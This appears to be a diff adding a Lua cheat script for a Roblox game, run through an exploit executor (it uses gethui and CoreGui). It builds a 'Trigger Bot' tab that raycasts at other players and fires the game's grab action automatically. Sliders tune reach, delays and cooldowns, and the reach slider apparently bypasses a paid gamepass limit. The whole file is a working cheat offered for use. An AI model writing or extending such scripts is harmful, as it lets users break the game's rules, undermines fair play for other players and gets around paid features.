+local v51 = {
+  Enabled = false,
+  Connection = nil,
+  canGrab = true,
+  maxDistance = 20,
+  preGrabDelay = 0.00001,
+  postGrabDelay = 0.05,
+  lastTarget = nil,
+  lastHitTime = 0,
+  targetMemoryDuration = 0.1,
+  checkThrottle = 0.008,
+  lastCheck = 0,
+  cooldown = 0.8,
+  lastReleaseTime = 0,
+}
+
+local raycastParams = RaycastParams.new()
+raycastParams.FilterType = Enum.RaycastFilterType.Exclude
+
+task.spawn(function()
+  local v52, v53 = pcall(function()
+    return replicatedStorage.GamepassEvents.CheckForGamepass:InvokeServer(20837132)
+  end)
+
+  if v52 and v53 then
+    v51.maxDistance = 29.3
+  end
+end)
+
+if replicatedStorage:FindFirstChild("GamepassEvents")
+  and replicatedStorage.GamepassEvents:FindFirstChild("FurtherReachBoughtNotifier") then
+  replicatedStorage.GamepassEvents.FurtherReachBoughtNotifier.OnClientEvent:Connect(function()
+    v51.maxDistance = 29.3
+  end)
+end
+
+function v51:GetTarget()
+  local character4 = localPlayer.Character
+
+  if not character4 or not character4:FindFirstChild("HumanoidRootPart") then
+    return nil
+  elseif workspaceService:FindFirstChild("GrabParts") then
+    return nil
+  else
+    local position = currentCamera.CFrame.Position
+    local lookVector = currentCamera.CFrame.LookVector
+    raycastParams.FilterDescendantsInstances = { character4, workspaceService.Terrain }
+    local raycast = workspaceService:Raycast(position, lookVector * 1000, raycastParams)
+
+    if not raycast then
+      for index5, value25 in ipairs({
+        lookVector, (lookVector + Vector3.new(0, 0.075, 0)).Unit,
+        (lookVector - Vector3.new(0, 0.075, 0)).Unit,
+      }) do
+        raycast = workspaceService:Raycast(position, value25 * 1000, raycastParams)
+
+        if raycast then
+          break
+        end
+      end
+    end
+
+    if not raycast then
+      return nil
+    else
+      local model = raycast.Instance:FindFirstAncestorOfClass("Model")
+
+      if not model or not model:FindFirstChildOfClass("Humanoid") or model == character4 then
+        return nil
+      elseif model:FindFirstChildOfClass("Humanoid").Health <= 0 then
+        return nil
+      else
+        local humanoidRootPart = model:FindFirstChild("HumanoidRootPart")
+
+        if not humanoidRootPart then
+          return nil
+        end
+
+        if (character4.HumanoidRootPart.Position - humanoidRootPart.Position).Magnitude
+          > self.maxDistance then
+          return nil
+        end
+
+        return model
+      end
+    end
+  end
+end
+
+local function f21()
+  pcall(function() contextActionService:CallFunction("Grab", Enum.UserInputState.Begin, nil) end)
+  task.wait(0.05)
+  pcall(function() contextActionService:CallFunction("Grab", Enum.UserInputState.End, nil) end)
+end
+
+function v51:OnHeartbeat()
+  if not self.Enabled or not self.canGrab then
+    return
+  elseif userInputService:GetFocusedTextBox() then
+    return
+  elseif tick() - self.lastCheck < self.checkThrottle then
+    return
+  else
+    self.lastCheck = tick()
+
+    if not workspaceService:FindFirstChild("GrabParts") then
+      if tick() - self.lastReleaseTime < self.cooldown then
+        return
+      end
+    end
+
+    local getTarget = self:GetTarget()
+
+    if getTarget then
+      self.lastTarget = getTarget
+      self.lastHitTime = tick()
+    elseif self.lastTarget and tick() - self.lastHitTime > self.targetMemoryDuration then
+      self.lastTarget = nil
+    end
+
+    local character5 = localPlayer.Character
+
+    local humanoidRootPart2 = self.lastTarget
+      and self.lastTarget:FindFirstChild("HumanoidRootPart")
+
+    if not (self.lastTarget and character5 and character5:FindFirstChild("HumanoidRootPart")
+      and humanoidRootPart2) then
+      return
+    end
+
+    if (character5.HumanoidRootPart.Position - humanoidRootPart2.Position).Magnitude
+      > self.maxDistance then
+      self.lastTarget = nil
+      return
+    end
+
+    if self.lastTarget then
+      self.canGrab = false
+
+      task.spawn(function()
+        task.wait(self.preGrabDelay)
+        f21()
+        local v54 = tick()
+        local v55
+
+        repeat
+          task.wait(0.02)
+          v55 = not workspaceService:FindFirstChild("GrabParts") or tick() - v54 > 1.6
+        until v55
+
+        self.lastReleaseTime = tick()
+        task.wait(self.postGrabDelay)
+
+        self.canGrab = true
+        self.lastTarget = nil
+      end)
+    end
+
+    return
+  end
+end
+
+local triggerBot = addTab:AddLeftGroupbox("Trigger Bot")
+local status = addTab:AddRightGroupbox("Status")
+local statusDisabled = status:AddLabel("Status: Disabled")
+local cooldown055sAfterRelease = status:AddLabel("Cooldown: 0.55s (after release)")
+
+triggerBot:AddToggle("EnableTriggerBot", {
+  Text = "Enable Trigger Bot",
+  Default = false,
+  Tooltip = "Toggle trigger bot on/off",
+  Callback = function(value26)
+    v51.Enabled = value26
+
+    if v51.Enabled and not v51.Connection then
+      v51.Connection = runService.Heartbeat:Connect(function() v51:OnHeartbeat() end)
+      statusDisabled:SetText("Status: Active")
+    elseif not v51.Enabled and v51.Connection then
+      v51.Connection:Disconnect()
+      v51.Connection = nil
+      statusDisabled:SetText("Status: Disabled")
+    end
+  end,
+})
+
+triggerBot:AddSlider("MaxDistance", {
+  Text = "Max Distance",
+  Default = 29.3,
+  Min = 10,
+  Max = 30,
+  Rounding = 1,
+  Tooltip = "Maximum grab range",
+  Callback = function(value27) v51.maxDistance = value27 end,
+})
+
+triggerBot:AddSlider("PreGrabDelay", {
+  Text = "Pre Grab Delay",
+  Default = 0.00001,
+  Min = 0,
+  Max = 0.5,
+  Rounding = 5,
+  Tooltip = "Delay before grab (prediction)",
+  Callback = function(value28) v51.preGrabDelay = value28 end,
+})
+
+triggerBot:AddSlider("PostGrabDelay", {
+  Text = "Post Grab Delay",
+  Default = 0.05,
+  Min = 0,
+  Max = 0.5,
+  Rounding = 2,
+  Tooltip = "Delay after grab release",
+  Callback = function(value29) v51.postGrabDelay = value29 end,
+})
+
+triggerBot:AddSlider("TargetMemory", {
+  Text = "Target Memory",
+  Default = 0.1,
+  Min = 0,
+  Max = 1,
+  Rounding = 2,
+  Tooltip = "How long to remember target after losing sight",
+  Callback = function(value30) v51.targetMemoryDuration = value30 end,
+})
+
+triggerBot:AddSlider("CheckThrottle", {
+  Text = "Check Throttle",
+  Default = 0.008,
+  Min = 0.001,
+  Max = 0.1,
+  Rounding = 3,
+  Tooltip = "Time between target checks",
+  Callback = function(value31) v51.checkThrottle = value31 end,
+})
+
+triggerBot:AddSlider("Cooldown", {
+  Text = "Cooldown",
+  Default = 0.55,
+  Min = 0.1,
+  Max = 3,
+  Rounding = 2,
+  Tooltip = "Seconds between grabs (starts after release)",
+  Callback = function(value32)
+    v51.cooldown = value32
+    cooldown055sAfterRelease:SetText("Cooldown: " .. tostring(value32) .. "s (after release)")
+  end,
+})
+
+status:AddLabel("Pc but mobile")
+status:AddLabel("Dont mess with with the other stuff")
+status:AddLabel("Only use cooldown")
+status:AddLabel("Mobile fps are bad ")
+status:AddLabel("wont grab correctly due to 60fps")
+
+localPlayer.CharacterAdded:Connect(function(character6)
+  character6:WaitForChild("Humanoid").Died:Connect(function()
+    if v51.Enabled then
+      v51.canGrab = true
+      v51.lastTarget = nil
+      v51.lastReleaseTime = 0
+
+      statusDisabled:SetText("Status: Died - Reset")
+    end
+  end)
+end)
+
+local function f22()
+  local v56, v57 = pcall(function() return gethui() end)
+  local v58 = {}
+
+  if v56 and v57 then
+    table.insert(v58, v57)
+  end
+
+  local v59 = game
+  table.insert(v58, v59:GetService("CoreGui"))
+
+  for index6, value33 in ipairs(v58) do
+    for index7, value34 in ipairs(value33:GetDescendants()) do
+      if value34:IsA("ScreenGui") then
+        for index8, value35 in ipairs(value34:GetDescendants()) do
+          if value35:IsA("TextLabel") and value35.Text == "Mobile Trigger Bot" then
+            return value34
+          end
+        end
+      end
+    end
+  end
+
+  return nil
+end
+
+local function f23(p19)
+  if not p19 then
+    return
+  end
+
+  for index9, value36 in ipairs(p19:GetDescendants()) do
+    if value36:IsA("GuiObject") then
+      local uiCorner = value36:FindFirstChildOfClass("UICorner")
+
+      if uiCorner then
+        uiCorner.CornerRadius = UDim.new(0, 30)
+      end
+    end
+  end
+end
+
+task.spawn(function()
+  task.wait(0.15)
+  f23(f22())
+end)
